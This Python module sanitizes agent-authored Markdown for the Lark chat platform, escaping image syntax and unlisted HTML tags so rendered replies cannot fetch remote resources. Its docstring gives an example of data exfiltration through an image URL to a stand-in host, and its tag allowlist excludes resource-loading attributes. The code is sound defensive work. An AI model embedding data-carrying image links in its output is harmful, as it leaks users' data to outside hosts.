"""Agent-authored Markdown must not make a chat platform fetch a remote image.

Agent text can carry data an agent read, so ``![](https://host/?d=...)`` is an outbound request the moment a client
or platform renders it. ``neutralize_images`` therefore does not try to recognise every URL shape; it removes the
ability to render an image from anything that is not provably safe:

* An image construct is ``![label]`` followed by ``(``, ``[`` or ``[]``, or a bare ``![label]`` whose label has a
  link reference definition in the text. It is kept only as ``![alt](target)`` with ``target`` exactly a Lark image
  key. A plain ``http(s)`` target becomes ``image: [alt (host)](url)`` (a link, fetched only on a click); every
  other construct (reference-style, nested brackets or escapes in the label, angle-bracket, titled or spaced
  targets, protocol-relative or entity-encoded URLs, unterminated or over-long labels) loses its ``!``, written as ``&#33;``, so it stays
  text or a plain link and the brackets around it keep their structure. Other ``![`` such as ``vec![1, 2]`` are left alone.
* Every HTML tag opener (``<`` plus a letter, ``/`` and a letter, ``!`` or ``?``) has its ``<`` written as
  ``&#60;``, the escape Lark's card Markdown documents, except Lark's own tags (``LARK_TAGS``) carrying only the
  attributes listed for them (URL attributes take a plain http(s) URL, the others a short word, so ``style``,
  ``background``, ``src`` or ``url(...)`` never pass) and ``<http(s)://...>`` or ``<mailto:...>`` autolinks. Lark documents that its ``md`` tag does not support arbitrary raw HTML and does not say
  what the card Markdown component does with tags it does not list, so no unlisted tag is sent as a tag. Lark's
  ``<link>`` and ``<audio>`` are left out of the allowlist on purpose: they are also resource-loading HTML.
* Code is preserved: top-level fenced blocks (a backtick fence info string has no backticks) and inline code
  spans. A span never crosses a newline, and the spans of a run of consecutive non-blank lines are trusted only
  when every backtick run in it pairs within its own line; otherwise that run of lines has no code spans and
  everything in it is neutralized. That covers the block boundaries (headings, quotes, list items, reference
  definitions) that end a CommonMark paragraph and make a cross-line pairing a guess. Indented code and fences indented 4+ spaces are not
  recognised, so images in them are neutralized (a code sample there may show ``&#33;[`` instead of ``![``).
  Neutralizing is the safe direction when this parser and the renderer disagree about what is code.

The scan is a single pass with every inner search bounded, so the cost is linear in the input and the function is
safe to call on the event loop.
"""
from __future__ import annotations

import bisect
import re
from urllib.parse import urlsplit

_KEY = re.compile(r"img_[A-Za-z0-9_-]{1,120}")
_URL = re.compile(r"https?://[^\s<>()\"'\\\[\]`]{1,1800}", re.I)
_FENCE = re.compile(r" {0,3}(`{3,}|~{3,})(.*)")
_RUN = re.compile(r"`+")
_BRACKET = re.compile(r"[\[\]\\]")
_DEFINITION = re.compile(r"(?:[ \t>*+-]|\d{1,9}[.)])*\[((?:[^\[\]\\]|\\.){1,999})\]:")
_URL_ATTR = "url"
# The tags Lark's Markdown defines, each with the attributes it may carry. A tag outside this table, or a listed tag
# with another attribute (``style``, ``background``, ``src``, ``srcset`` ...), is written as text. URL attributes
# take a plain http(s) URL, every other attribute a short word, so no value can hold ``url(...)`` or a scheme trick.
LARK_TAGS: dict[str, frozenset[str]] = {
    "at": frozenset({"id", "user_id", "email"}),
    "a": frozenset({"href", "pc_url", "android_url", "ios_url"}),
    "font": frozenset({"color"}),
    "text_tag": frozenset({"color"}),
    "person": frozenset({"id", "show_name", "show_avatar"}),
    "local_datetime": frozenset({"millisecond", "format_type"}),
    "number_tag": frozenset({"font_color", "background_color", "url", "pc_url", "android_url", "ios_url"}),
    "raw": frozenset(), "u": frozenset(), "br": frozenset(), "hr": frozenset(),
}
_URL_ATTRS = frozenset({"href", "pc_url", "android_url", "ios_url", "url"})
_OPENER = re.compile(r"<(?=[A-Za-z]|/[A-Za-z]|[!?])")
_AUTOLINK = re.compile(r"<(?:https?://|mailto:)[^\s<>]*>", re.I)
_LARK_TAG = re.compile(
    r"<(/?)([A-Za-z][A-Za-z0-9_]*)((?:\s+[A-Za-z_][\w-]*(?:\s*=\s*(?:\"[^\"<>]*\"|'[^'<>]*'|[^\s\"'<>=`]+))?)*)\s*(/?)>")
_ATTR = re.compile(r"\s+([A-Za-z_][\w-]*)(?:\s*=\s*(\"[^\"<>]*\"|'[^'<>]*'|[^\s\"'<>=`]+))?")
_WORD = re.compile(r"[A-Za-z0-9_.@#:+-]{0,100}")
_HTTP_URL = re.compile(r"https?://(?:[^\s\"'<>&\\`]|&(?!#|[A-Za-z]+;)){1,1800}", re.I)


def _lark_tag(text: str, position: int) -> bool:
    """True when the tag at ``position`` is one of Lark's tags with only attributes it may carry."""
    match = _LARK_TAG.match(text, position)
    if not match:
        return False
    closing, name, attrs, _ = match.groups()
    allowed = LARK_TAGS.get(name.lower())
    if allowed is None or (closing and attrs.strip()):
        return False
    for attr in _ATTR.finditer(attrs):
        key = attr[1].lower()
        value = (attr[2] or "").strip("\"'")
        if key not in allowed:
            return False
        if not (_HTTP_URL.fullmatch(value) if key in _URL_ATTRS else _WORD.fullmatch(value)):
            return False
    return True


def _starts_html_block(line: str) -> bool:
    """True when ``line`` starts with a tag that is sent as a tag: a renderer with raw HTML on may read it as the
    start of an HTML block. Tags that are escaped to text cannot."""
    match = _HTML_BLOCK.match(line)
    return bool(match) and _lark_tag(line, line.index("<"))


def _escape_tags(text: str) -> str:
    """Write the ``<`` of every tag opener as ``&#60;`` unless it is a Lark tag or an http(s)/mailto autolink."""
    if "<" not in text:
        return text
    out: list[str] = []
    position = 0
    for match in _OPENER.finditer(text):
        start = match.start()
        if _AUTOLINK.match(text, start) or _lark_tag(text, start):
            continue
        out.append(text[position:start])
        out.append("&#60;")
        position = start + 1
    out.append(text[position:])
    return "".join(out)


_HTML_BLOCK = re.compile(r" {0,3}<(?!(?:https?://|mailto:))/?[A-Za-z]", re.I)
_ALT_MAX = 300
_DEST_MAX = 2000
_NESTING_STEPS = 16
_NEUTRAL = "&#33;["


def _normalize(label: str) -> str:
    return " ".join(label.split()).casefold()


def _close(text: str, i: int) -> int:
    """Index of the ``]`` that closes the ``![`` at ``i`` within the label window, or -1."""
    end = i + 2 + _ALT_MAX
    j = text.find("]", i + 2, end)
    if j == -1:
        return -1
    if text.find("[", i + 2, j) == -1 and text.find("\\", i + 2, j) == -1:
        return j
    depth, skip, steps = 1, -1, 0
    for match in _BRACKET.finditer(text, i + 2, end):
        steps += 1
        if steps > _NESTING_STEPS:
            return -1
        if match.start() < skip:
            continue
        char = match[0]
        if char == "\\":
            skip = match.end() + 1
        elif char == "[":
            depth += 1
        else:
            depth -= 1
            if depth == 0:
                return match.start()
    return -1


def _images(text: str, definitions: frozenset[str]) -> str:
    """Neutralize the image constructs in prose ``text``; keep ``![alt](image_key)``; escape tag openers."""
    out: list[str] = []
    position = 0
    i = text.find("![")
    while i != -1:
        close = _close(text, i)
        piece_end = i + 2
        replacement = _NEUTRAL
        slashes = 0
        while i - slashes - 1 >= 0 and text[i - slashes - 1] == "\\":
            slashes += 1
        if slashes % 2:
            replacement = "!["  # ``\\!`` is a literal bang: the rest is a link or text, not an image
        elif close != -1:
            alt = text[i + 2:close]
            following = text[close + 1:close + 2]
            if following == "(":
                end = text.find(")", close + 2, close + 2 + _DEST_MAX)
                dest = text[close + 2:end] if end != -1 else ""
                clean = not any(c in alt for c in "[]\\\n")
                if clean and _KEY.fullmatch(dest):
                    replacement, piece_end = text[i:end + 1], end + 1
                elif clean and _URL.fullmatch(dest) and urlsplit(dest).hostname:
                    host = urlsplit(dest).hostname
                    replacement, piece_end = f"image: [{alt.strip() + ' ' if alt.strip() else ''}({host})]({dest})", end + 1
            elif following != "[" and _normalize(alt) not in definitions:
                replacement = "!["  # not an image: no target, no reference, no definition (``vec![1, 2]``)
        out.append(text[position:i])
        out.append(replacement)
        position = piece_end
        i = text.find("![", position)
    out.append(text[position:])
    return _escape_tags("".join(out))


def _spans(line: str) -> tuple[list[tuple[int, int]], bool]:
    """Inline code spans (opening run start, closing run end) in one line, and whether every backtick run of the
    line is part of one. A backslash before a run escapes only its first backtick (the opener is then one shorter);
    a closing run matches on its raw length, as in CommonMark, where a backslash inside a span is literal."""
    runs: list[tuple[int, int, int]] = []  # (opener start, end, raw length)
    for match in _RUN.finditer(line):
        start, end = match.span()
        slashes = 0
        while start - slashes - 1 >= 0 and line[start - slashes - 1] == "\\":
            slashes += 1
        opener = start + 1 if slashes % 2 else start
        runs.append((opener, end, end - start))
    by_length: dict[int, list[int]] = {}
    for index, (_, _, raw) in enumerate(runs):
        by_length.setdefault(raw, []).append(index)
    spans: list[tuple[int, int]] = []
    clean = True
    index = 0
    while index < len(runs):
        opener, _, raw = runs[index]
        length = runs[index][1] - opener
        if length == 0:  # a lone escaped backtick is a literal character
            index += 1
            continue
        candidates = by_length.get(length, [])
        position = bisect.bisect_right(candidates, index)
        if position == len(candidates):
            clean = False
            index += 1
        else:
            close = candidates[position]
            spans.append((opener, runs[close][1]))
            index = close + 1
    return spans, clean


def _prose(text: str, definitions: frozenset[str], spans: list[tuple[int, int]]) -> str:
    out: list[str] = []
    position = 0
    for start, end in spans:
        out.append(_images(text[position:start], definitions))
        out.append(text[start:end])
        position = end
    out.append(_images(text[position:], definitions))
    return "".join(out)


MAX_SCANNED_CHARS = 64 * 1024
_ANY_TAG_OPENER = re.compile(r"<(?=[A-Za-z]|/[A-Za-z]|[!?])")


def _neutralize_everything(markdown: str) -> str:
    """The cheap form for text above ``MAX_SCANNED_CHARS``: no parsing, so no code, key, link or Lark tag is kept."""
    return _ANY_TAG_OPENER.sub("&#60;", markdown.replace("![", _NEUTRAL))


def neutralize_images(markdown: str) -> str:
    """Neutralize the images and resource-loading tags of agent Markdown (see the module docstring).

    The scan runs synchronously on the event loop. It costs about 0.5 us per character in the worst case, so up to
    ``MAX_SCANNED_CHARS`` (64 Ki characters, far above a chat reply: Telegram caps a message at 4096, Lark's card and
    post bodies are far smaller than this) it stays under about 30 ms. A longer text takes the single-pass
    ``_neutralize_everything`` instead, whose cost is a C-level replace and substitution.
    """
    if "![" not in markdown and "<" not in markdown:
        return markdown
    if len(markdown) > MAX_SCANNED_CHARS:
        return _neutralize_everything(markdown)
    lines = markdown.splitlines(keepends=True)
    definitions = frozenset(_normalize(m[1]) for m in map(_DEFINITION.match, lines) if m)
    out: list[str] = []
    paragraph: list[str] = []
    fence: str | None = None
    html_block = False  # a line starting with a Lark tag may open an HTML block, which ends only at a blank line

    def flush() -> None:
        # Trust the code spans of a run of lines only when every backtick run pairs within its own line. A
        # stray backtick may pair with one on another line (or not at all) depending on the block structure,
        # so such a run of lines is treated as having no code spans and every ``![`` in it is neutralized, with no
        # attempt to tell an image from text. The same holds when a line starts with a Lark tag: a renderer with
        # raw HTML on reads it as an HTML block, which ends only at a blank line and makes the backticks after it
        # literal. The images of a trusted run are scanned across its lines, since an image may span lines.
        if not paragraph:
            return
        text = "".join(paragraph)
        # The pairing check keeps nothing per line: a huge paragraph must not leave a tracked object per line alive.
        if all(_spans(line)[1] for line in paragraph) and not any(_starts_html_block(line) for line in paragraph):
            spans: list[tuple[int, int]] = []
            offset = 0
            for line in paragraph:
                spans.extend((offset + start, offset + end) for start, end in _spans(line)[0])
                offset += len(line)
            out.append(_prose(text, definitions, spans))
        else:
            out.append(_escape_tags(text.replace("![", _NEUTRAL)))
        paragraph.clear()

    for line in lines:
        match = _FENCE.fullmatch(line.rstrip("\r\n"))
        if fence is not None:
            out.append(line)
            if match and match[1][0] == fence[0] and len(match[1]) >= len(fence) and not match[2].strip():
                fence = None
        elif match and not html_block and not (match[1][0] == "`" and "`" in match[2]):
            flush()
            fence = match[1]
            out.append(line)
        elif not line.strip():
            flush()
            html_block = False
            out.append(line)
        else:
            html_block = html_block or _starts_html_block(line)
            paragraph.append(line)
    flush()
    return "".join(out)
